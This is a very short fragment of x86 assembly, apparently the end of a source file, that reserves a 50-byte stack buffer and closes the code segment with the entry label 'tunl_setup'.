fooger_stack:
db      50      dup (?)
ends    code
end     tunl_setup


